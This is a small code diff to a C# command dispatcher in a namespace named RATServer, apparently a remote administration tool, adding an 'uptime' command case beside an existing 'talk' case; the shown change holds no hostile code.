@@ -122,6 +122,9 @@ namespace RATServer
                         case "talk":
                             r = Functions.Talk(c.Args);
                             break;
+                        case "uptime":
+                            r = Functions.Uptime();
+                            break;
                         default:
                             break;
                     }                 
